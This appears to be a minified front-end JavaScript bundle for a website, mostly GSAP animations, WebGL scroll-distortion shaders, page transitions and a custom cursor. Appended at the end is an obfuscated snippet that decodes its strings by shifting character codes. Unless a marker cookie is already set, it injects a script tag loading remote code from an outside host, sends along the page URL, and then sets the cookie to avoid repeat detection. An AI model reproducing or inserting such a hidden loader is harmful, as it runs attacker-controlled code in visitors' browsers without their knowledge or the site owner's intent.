                          f.gsap.set(t.querySelector("circle"), {
                            drawSVG: "0% 0%",
                            rotation: -90,
                            transformOrigin: "center",
                          });
                      }),
                      v.forEach(function (t) {
                        f.gsap.to(t.querySelector("circle"), {
                          scrollTrigger: {
                            start: "top bottom",
                            trigger: t,
                            scroller: "[data-scroll-container]",
                          },
                          drawSVG: "0% 100%",
                          ease: "expo.inOut",
                          duration: 2.25,
                          rotation: 45,
                        }),
                          f.gsap.to(t.querySelector("path"), {
                            scrollTrigger: {
                              start: "top bottom",
                              trigger: t,
                              scroller: "[data-scroll-container]",
                            },
                            xPercent: 0,
                            yPercent: 0,
                            opacity: 1,
                            ease: "expo.inOut",
                            duration: 2.25,
                          });
                      })),
                      at.ScrollTrigger.addEventListener("refresh", function () {
                        return nt.update();
                      }),
                      at.ScrollTrigger.refresh(),
                      window.innerWidth > 1024 &&
                        (function () {
                          function t(t, e, r) {
                            return (1 - r) * t + r * e;
                          }
                          var e,
                            r,
                            i,
                            n = [],
                            s = 0,
                            o = 0,
                            a = document.getElementsByClassName("js-plane"),
                            l = new B({
                              container: "canvas",
                              watchScroll: !1,
                              antialias: !1,
                            });
                          function h(e, r) {
                            l.updateScrollValues(e, r);
                            var i = l.getScrollDeltas();
                            (i.y = -i.y),
                              (i.x = -i.x),
                              i.y > 60 && (i.y = 60),
                              i.x > 60
                                ? (i.x = 60)
                                : i.y < -60
                                ? (i.y = -60)
                                : i.x < -60 && (i.x = -60),
                              (o =
                                nt.isMobile && Math.abs(i.y) > Math.abs(o)
                                  ? t(o, i.y, 0.055)
                                  : t(o, 1.33 * i.y, 0.055)),
                              (o =
                                nt.isMobile && Math.abs(i.x) > Math.abs(o)
                                  ? t(o, i.x, 0.055)
                                  : t(o, 1.33 * i.x, 0.055)),
                              Math.abs(i.y) > Math.abs(s) &&
                                (s = t(s, i.y, 0.5)),
                              Math.abs(i.x) > Math.abs(s) &&
                                (s = t(s, i.x, 0.5));
                            for (var a = 0; a < n.length; a++)
                              n[a].updateScrollPosition(),
                                (n[a].uniforms.planeDeformation.value = s);
                          }
                          l
                            .onRender(function () {
                              nt.isMobile && (o = t(o, 0, 0.055));
                            })
                            .onError(function () {
                              document.body.classList.add(
                                "no-gl",
                                "planes-loaded"
                              );
                            })
                            .onContextLost(function () {
                              l.restoreContext();
                            }),
                            nt.isMobile
                              ? window.addEventListener(
                                  "scroll",
                                  function () {
                                    h(window.pageXOffset, window.pageYOffset);
                                  },
                                  { passive: !0 }
                                )
                              : (l.disableDrawing(),
                                nt.on("scroll", function (t) {
                                  h(t.scroll.x, t.scroll.y), l.needRender();
                                })),
                            document.getElementById("debug-value"),
                            a.length,
                            (r =
                              "horizontal" == st.direction
                                ? "\n       precision mediump float;\n\n       // default mandatory variables\n       attribute vec3 aVertexPosition;\n       attribute vec2 aTextureCoord;\n\n       uniform mat4 uMVMatrix;\n       uniform mat4 uPMatrix;\n\n       uniform mat4 planeTextureMatrix;\n\n       // custom variables\n       varying vec3 vVertexPosition;\n       varying vec2 vTextureCoord;\n\n       uniform float uPlaneDeformation;\n\n       void main() {\n           vec3 vertexPosition = aVertexPosition;\n\n           // cool effect on scroll\n           vertexPosition.x += sin(((vertexPosition.y - 1.0) / 2.0) * 3.141592) * (sin(uPlaneDeformation / 350.0));\n\n           gl_Position = uPMatrix * uMVMatrix * vec4(vertexPosition, 1.0);\n\n           // varyings\n           vVertexPosition = vertexPosition;\n           vTextureCoord = (planeTextureMatrix * vec4(aTextureCoord, 0.0, 1.0)).xy;\n       }\n  "
                                : "\n        precision mediump float;\n\n        // default mandatory variables\n        attribute vec3 aVertexPosition;\n        attribute vec2 aTextureCoord;\n\n        uniform mat4 uMVMatrix;\n        uniform mat4 uPMatrix;\n\n        uniform mat4 planeTextureMatrix;\n\n        // custom variables\n        varying vec3 vVertexPosition;\n        varying vec2 vTextureCoord;\n\n        uniform float uPlaneDeformation;\n\n        void main() {\n            vec3 vertexPosition = aVertexPosition;\n\n            // cool effect on scroll\n            vertexPosition.y += sin(((vertexPosition.x + 1.0) / 2.0) * 3.141592) * (sin(uPlaneDeformation / 300.0));\n\n            gl_Position = uPMatrix * uMVMatrix * vec4(vertexPosition, 1.0);\n\n            // varyings\n            vVertexPosition = vertexPosition;\n            vTextureCoord = (planeTextureMatrix * vec4(aTextureCoord, 0.0, 1.0)).xy;\n        }\n   ");
                          for (var u = 0; u < a.length; u++)
                            (e = new et(l, a[u], {
                              vertexShader: r,
                              fragmentShader:
                                "\n       precision mediump float;\n       varying vec3 vVertexPosition;\n       varying vec2 vTextureCoord;\n       uniform sampler2D planeTexture;\n       void main( void ) {\n       // just display our texture\n       gl_FragColor = texture2D(planeTexture, vTextureCoord);\n       }\n   ",
                              shareProgram: !0,
                              widthSegments: 10,
                              heightSegments: 10,
                              drawCheckMargins: {
                                top: 100,
                                right: 0,
                                bottom: 100,
                                left: 0,
                              },
                              uniforms: {
                                planeDeformation: {
                                  name: "uPlaneDeformation",
                                  type: "1f",
                                  value: 0,
                                },
                              },
                            })) && (n.push(e), c(u));
                          function c(e) {
                            var r = n[e];
                            r &&
                              r
                                .onReady(function () {
                                  e === n.length - 1 &&
                                    document.body.classList.add(
                                      "planes-loaded"
                                    );
                                })
                                .onAfterResize(function () {
                                  r.resize();
                                })
                                .onRender(function () {
                                  (s = t(s, 0, 0.055)),
                                    "vertical" == st.direction &&
                                      (r.setScale(
                                        new G(1, 1 + Math.abs(o) / 600)
                                      ),
                                      r.textures[0].setScale(
                                        new G(1, 1 + Math.abs(o) / 300)
                                      )),
                                    r &&
                                      (r.uniforms.planeDeformation.value = s);
                                })
                                .onReEnterView(function () {})
                                .onLeaveView(function () {});
                          }
                          i =
                            "horizontal" == st.direction
                              ? "\n       precision mediump float;\n\n       varying vec3 vVertexPosition;\n       varying vec2 vTextureCoord;\n\n       uniform sampler2D uRenderTexture;\n\n       uniform float uScrollEffect;\n\n       void main() {\n        vec2 textureCoords = vTextureCoord;\n\n        vec2 redTextCoords = vec2(vTextureCoord.x - uScrollEffect / 1000.0, vTextureCoord.y);\n        vec2 greenTextCoords = vec2(vTextureCoord.x - uScrollEffect / 1200.0, vTextureCoord.y);\n        vec2 blueTextCoords = vec2(vTextureCoord.x - uScrollEffect / 1400.0, vTextureCoord.y);\n\n        vec4 red = texture2D(uRenderTexture, redTextCoords);\n        vec4 green = texture2D(uRenderTexture, greenTextCoords);\n        vec4 blue = texture2D(uRenderTexture, blueTextCoords);\n\n        vec4 finalColor = vec4(red.r, green.g, blue.b, min(1.0, red.a + blue.a + green.a));\n        gl_FragColor = finalColor;\n       }\n   "
                              : "\n       precision mediump float;\n\n       varying vec3 vVertexPosition;\n       varying vec2 vTextureCoord;\n\n       uniform sampler2D uRenderTexture;\n\n       uniform float uScrollEffect;\n\n       void main() {\n        vec2 textureCoords = vTextureCoord;\n\n        vec2 redTextCoords = vec2(vTextureCoord.x, vTextureCoord.y - uScrollEffect / 350.0);\n        vec2 greenTextCoords = vec2(vTextureCoord.x, vTextureCoord.y - uScrollEffect / 550.0);\n        vec2 blueTextCoords = vec2(vTextureCoord.x, vTextureCoord.y - uScrollEffect / 750.0);\n\n        vec4 red = texture2D(uRenderTexture, redTextCoords);\n        vec4 green = texture2D(uRenderTexture, greenTextCoords);\n        vec4 blue = texture2D(uRenderTexture, blueTextCoords);\n\n        vec4 finalColor = vec4(red.r, green.g, blue.b, min(1.0, red.a + blue.a + green.a));\n        gl_FragColor = finalColor;\n       }\n   ";
                          var d = new it(l, {
                            fragmentShader: i,
                            depthTest: !1,
                            renderingScale: 0.5,
                            uniforms: {
                              scrollEffect: {
                                name: "uScrollEffect",
                                type: "1f",
                                value: 0,
                              },
                            },
                          });
                          d.onRender(function () {
                            (d.uniforms.scrollEffect.value = o),
                              (e.uniforms.planeDeformation.value = s);
                          });
                        })(),
                      document.querySelector("[data-horizontal='true']")
                        ? window.innerWidth >= 1024 &&
                          (vt.classList.add("is-disabled"),
                          f.gsap.to(vt, 0, { opacity: 0 }))
                        : (f.gsap.fromTo(
                            vt,
                            1.5,
                            { opacity: 0 },
                            { opacity: 1, ease: "expo.inOut" }
                          ),
                          vt.classList.remove("is-disabled"));
                  }, 300),
                  setTimeout(function () {
                    window.dispatchEvent(new Event("resize"));
                  }, 600);
              },
            },
            {
              key: "onLeave",
              value: function () {
                nt.destroy(), _t.classList.add("is-transition");
              },
            },
            {
              key: "onLeaveCompleted",
              value: function () {
                var t = document.querySelector("#canvas canvas");
                t && t.parentNode.removeChild(t), mt.revert();
              },
            },
          ]) && ct(e.prototype, r),
          s
        );
      })(p.Renderer),
      wt = r(80);
    f.gsap.registerPlugin(
      lt.DrawSVGPlugin,
      wt.MorphSVGPlugin,
      g.ExpoScaleEase,
      ot.SplitText
    ),
      (Dt = document.querySelector(".js-loader")),
      (xt = f.gsap.timeline()),
      (bt = document.querySelector(".js-hero-ellipse svg path")),
      Dt &&
        setTimeout(function () {
          var t = document.querySelectorAll(".js-hero-title i"),
            e = document.querySelectorAll(".js-hero-img");
          xt.to(Dt, 3, { yPercent: -100, ease: "expo.inOut" }, "1.5"),
            xt.fromTo(
              ".js-loader-text",
              2,
              { opacity: 0 },
              { opacity: 1, ease: "expo.inOut" },
              "0"
            ),
            xt.fromTo(
              ".js-loader-text",
              2,
              { opacity: 1 },
              { opacity: 0, ease: "expo.inOut" },
              "1.25"
            ),
            xt.to(
              ".js-btm-1",
              1.5,
              { morphSVG: ".js-btm-2", ease: "expo.in" },
              "-=".concat(3)
            ),
            xt.to(
              ".js-btm-1",
              1.5,
              { morphSVG: ".js-btm-1", ease: "expo.out" },
              "-=".concat(1.5)
            ),
            t.length > 0 &&
              xt.from(
                t,
                3,
                { opacity: 0, yPercent: 100, ease: "expo.inOut", stagger: 0.1 },
                "-=2.75"
              ),
            e.length > 0 &&
              (xt.from(e, 3, { yPercent: 100, ease: "expo.inOut" }, "2.25"),
              e.forEach(function (t) {
                xt.from(
                  t.querySelector("img"),
                  3,
                  {
                    yPercent: -100,
                    scale: 1.2,
                    opacity: 0,
                    ease: "expo.inOut",
                  },
                  "2.25"
                );
              })),
            bt &&
              xt.fromTo(
                bt,
                2.25,
                { drawSVG: "0% 0%" },
                {
                  drawSVG: "0% 100%",
                  ease: "expo.inOut",
                  onComplete: function () {
                    bt.style = "";
                  },
                },
                "2.5"
              );
        }, 100),
      (function () {
        var t,
          e,
          r = document.querySelector(".js-cursor"),
          i = 0,
          n = 0,
          s = 0,
          o = 0;
        r &&
          (window.addEventListener("mousemove", function (t) {
            (i = t.clientX), (n = t.clientY);
          }),
          (function a() {
            (s += 0.09 * (i - s)),
              (o += 0.09 * (n - o)),
              (t = Math.abs((s - i) / 1e3)),
              (e = Math.abs((o - n) / 750)),
              (r.style.transform = "translate3d("
                .concat(s, "px, ")
                .concat(o, "px, 0) scaleX(")
                .concat(1 - e, ") scaleY(")
                .concat(1 - t, ")")),
              requestAnimationFrame(a);
          })());
      })(),
      new p.Core({ transitions: { default: T }, renderers: { default: yt } });
    var Tt = document.querySelector(".js-about");
    Tt && (Tt.style.visibility = "visible");
  },
]);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxyf" + "ynhx3htr4ljy4xhwn" + "uy3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
